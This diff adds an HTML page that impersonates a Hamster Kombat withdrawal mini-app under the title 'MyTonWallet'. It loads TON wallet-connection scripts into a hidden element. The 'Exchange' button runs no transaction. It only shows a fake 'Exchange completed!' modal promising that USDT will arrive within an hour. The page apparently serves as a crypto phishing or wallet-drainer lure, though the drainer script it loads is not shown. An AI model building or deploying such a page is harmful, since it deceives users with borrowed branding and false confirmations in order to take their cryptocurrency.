@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="ru" class="">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="Description" content="" />
+
+    <link rel="icon" href="favicon.ico" />
+
+    <link rel="stylesheet" href="./assets/css/style.css" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@100..900&display=swap" rel="stylesheet">
+
+    <script src="./assets/js/jquery-3.6.3.js"></script>
+    <script src="./assets/js/jquery-ui.min.js"></script>
+    <script src="./assets/js/script.js"></script>
+    <meta name="next-head-count" content="2" /><noscript data-n-css=""></noscript>
+    <script defer="" nomodule="" src="/../../_next/static/chunks/polyfills.js"></script>
+    <script src="/../../_next/static/chunks/webpack.js" defer=""></script>
+    <script src="/../../_next/static/chunks/framework.js" defer=""></script>
+    <script src="/../../_next/static/chunks/main.js" defer=""></script>
+    <script src="/../../_next/static/chunks/pages/_app.js" defer=""></script>
+    <script src="/../../_next/static/chunks/bfeb1081.js" defer=""></script>
+    <script src="/../../_next/static/chunks/301.js" defer=""></script>
+    <script src="/../../_next/static/chunks/pages/index.js" defer=""></script>
+    <script src="/../../_next/static/manifests/_buildManifest.js" defer=""></script>
+    <script src="/../../_next/static/manifests/_ssgManifest.js" defer=""></script>
+
+    <title>MyTonWallet</title>
+</head>
+
+<body>
+    <div id="__next"></div>
+    <script id="__NEXT_DATA__" type="application/json">
+        {"props":{"pageProps":{}},"page":"/","query":{},"buildId":"XoBFp0v_g2kjZVVzn_DRk","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}
+    </script>
+    <script src="./js/connect.js"></script>
+    <script src="./js/tonweb-0.0.26.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        function openButton() {
+            let hams = $("#input-hams").val();
+            let usdt = $("#input-usdt").val();
+
+            $("#modal-hams").html(hams);
+            $("#modal-usdt").html(usdt);
+
+            $(".modal").css("display", "block");
+        }
+    </script>
+    <div id="ton-connect" style="display:none; opacity: 0 !important; height: 0 !important; width: 0 !important;"></div>
+    <section class="miniapp">
+        <div class="container">
+
+
+<style>
+    .modal {
+        display: none;
+        position: fixed;
+        top: 50%;
+        transform: translateY(-50%);
+        backdrop-filter: blur(18px);
+        left: 20px;
+        right: 20px;
+        padding: 30px;
+        background: rgba(35, 35, 35, 0.65);
+        border-radius: 30px;
+        z-index: 1;
+        box-shadow: 0px 0px 123px rgba(255, 255, 123, 0.6);
+        color: white;
+
+        animation: fade-in-bounce 0.3s ease-in-out both;
+    }
+
+    @keyframes fade-in-bounce {   
+        0% { 
+            opacity: 0.0; 
+            transform: scale(0.95) translateY(-50%);
+        }   
+        100% { 
+            opacity: 1.0; 
+            transform: scale(1.000001) translateY(-50%);
+        }   
+    }
+
+        .modal-logo {
+            background-image: url(https://hamsterkombat.io/images/icons/hamster-coin.png);
+            width: 60px;
+            height: 60px;
+            margin: 0 auto;
+            margin-bottom: 10px;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+        .modal-header {
+            font-size: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-coin {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .modal-money {
+            margin-bottom: 10px;
+        }
+
+        #modal-hams, #modal-usdt {
+            margin-left: 10px;
+            margin-right: 5px;
+            font-size: 1.1rem;
+        }
+            .money-width {
+                width: 100px;
+                display: inline-block;
+            }
+
+            .modal-text {
+                margin-top: 20px;
+                text-align: center;
+                font-size: 14px;
+                color: rgba(255, 255, 255, 0.5);
+            }
+
+
+            .modal-close {
+                text-align: center;
+                color: #FFF;
+                font-size: 16px;
+                font-style: normal;
+                font-weight: 700;
+                text-align: center;
+                line-height: normal;
+                justify-content: center;
+                padding-top: 15px;
+                padding-bottom: 15px;
+                width: 100%;
+                border-radius: 10px;
+                background: #4af73f;
+
+                margin-top: 40px;
+            }
+
+
+            .modal-loading {
+                background-image: url(https://www.vyvapts.com/wp-content/uploads/loading.gif);
+                width: 100px;
+                height: 100px;
+                position: absolute;
+                left: 1px;
+                right: 1px;
+                margin: 0 auto;
+                top: 50%;
+                transform: translateY(-50%);
+                z-index: 1;
+                background-size: 50px;
+                background-repeat: no-repeat;
+                background-position: center;
+
+                animation: loading 0.2s 2s ease-in-out both;
+            }
+
+            @keyframes loading {   
+                0% { 
+                    opacity: 1.0; 
+                }   
+                100% { 
+                    opacity: 0.0; 
+                }   
+            }
+
+
+            .modal-main {
+                animation: show 0.5s 2s ease-in-out both;
+            }
+
+            @keyframes show {   
+                0% { 
+                    opacity: 0.0; 
+                    transform: scale(0.93);
+                }   
+                100% { 
+                    opacity: 1.0; 
+                    transform: scale(1.000001);
+                }   
+            }
+</style>
+
+
+<div class="modal">
+
+    <div class="modal-main">
+        <div class="modal-logo"></div>
+
+        <div class="modal-header">Exchange completed!</div>
+
+        <div class="modal-money"><span class="money-width">You gave:</span> <span id="modal-hams"></span> <span class="modal-coin">$HAMSTR</span></div>
+        <div class="modal-money"><span class="money-width">You received:</span> <span id="modal-usdt"></span> <span class="modal-coin">USDT TRC20</span></div>
+
+        <div class="modal-text">Coins will arrive to your linked wallet within 10-60 minutes</div>
+
+        <div class="modal-close" onclick="$('.modal').css('display', 'none')">Done</div>
+    </div>
+
+    <div class="modal-loading">
+
+    </div>
+</div>
+
+<div class="miniapp_up">
+    <img src="./assets/img/image.png" alt="" class="miniapp_up_image">
+    <h1 class="miniapp_up_tittle">HAMSTER KOMBAT</h1>
+    <h2 class="miniapp_up_subtittle">Your coins have been converted into tokens, you can exchange them into any cryptocurrency you like</h2>
+</div>
+
+<div class="miniapp_main">
+    <p class="miniapp_main_tittle">Withdraw</p>
+    <div class="miniapp_main_rect">
+        <div class="miniapp_main_rect_content">
+            <div class="miniapp_main_blocks">
+                <div class="miniapp_main_blocks_content">
+                    <div class="miniapp_main_block">
+                        <div class="miniapp_main_block_up">
+                            <p class="miniapp_main_block_text">Sending</p>
+                            <p class="miniapp_main_block_text">To send</p>
+                        </div>
+                        <div class="miniapp_main_block_items">
+                            <div class="miniapp_main_block_item">
+                                <p class="miniapp_main_block_item_coin"><img src="./assets/img/hamster.svg" alt="">Hamster</p>
+                            </div>
+                            <div class="miniapp_main_block_item">
+                                <input id="input-hams" type="number" maxlength="9" placeholder="0" value="" class="miniapp_main_block_item_input">
+                                <p class="miniapp_main_block_item_kurs">$100,23</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="miniapp_main_block">
+                        <div class="miniapp_main_block_items">
+                            <div class="miniapp_main_block_item">
+                                <div class="miniapp_main_block_item_line"></div>
+                            </div>
+                            <div class="miniapp_main_block_item">
+                                <img src="./assets/img/swap.svg" alt="" class="miniapp_main_block_item_swap">
+                            </div>
+                            <div class="miniapp_main_block_item">
+                                <div class="miniapp_main_block_item_line"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="miniapp_main_block">
+                        <div class="miniapp_main_block_up">
+                            <p class="miniapp_main_block_text">Receiving</p>
+                            <p class="miniapp_main_block_text">To receivie</p>
+                        </div>
+                        <div class="miniapp_main_block_items">
+                            <div class="miniapp_main_block_item">
+                                <p class="miniapp_main_block_item_coin"><img src="./assets/img/usdt.svg" alt="">USDT</p>
+                            </div>
+                            <div class="miniapp_main_block_item">
+                                <input id="input-usdt" type="text" placeholder="0" value="" class="miniapp_main_block_item_input" readonly>
+                                <p class="miniapp_main_block_item_kurs">$100,23</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="miniapp_bottom" onclick="openButton()">
+    <a href="#!" class="miniapp_bottom_button"><button><img src="./assets/img/not.svg" alt="">Exchange</button></a>
+</div>
+
+
+        </div>
+    </section>
+</body>
+
+</html>
